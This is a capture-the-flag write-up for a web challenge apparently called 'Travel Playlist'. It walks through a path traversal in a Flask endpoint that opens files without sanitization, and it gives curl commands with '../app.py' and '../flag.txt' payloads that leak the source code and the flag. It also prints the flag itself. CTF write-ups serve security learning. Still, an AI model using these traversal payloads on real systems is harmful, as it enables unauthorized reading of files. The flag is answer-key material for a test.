# Travel Playlist

## Description
> *Nel mezzo del cammin di nostra vita*
> *mi ritrovai per una selva oscura,*
> *ché la diritta via era smarrita.*
>
> *The flag can be found here `/app/flag.txt`*

**URL:** https://travel.ctf.pascalctf.it

## Solution
**TL;DR**: Simple path traversal - read source code first, then flag
1. API endpoint `/api/get_json` reads files from `static/{index}` with NO sanitization
2. First, leak the source: `{"index": "../app.py"}` reveals the Flask app code
3. Source shows: `path = f"static/{index}"` then `open(path, "r")`
4. Flag is at `/app/flag.txt`, app runs from `/app/`
5. Use `{"index": "../flag.txt"}` which resolves to `static/../flag.txt` = `/app/flag.txt`

### Exploit
```bash
# Read source code
curl -X POST "https://travel.ctf.pascalctf.it/api/get_json" \
  -H "Content-Type: application/json" -d '{"index": "../app.py"}'

# Read flag
curl -X POST "https://travel.ctf.pascalctf.it/api/get_json" \
  -H "Content-Type: application/json" -d '{"index": "../flag.txt"}'
```

### Flag
> `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`
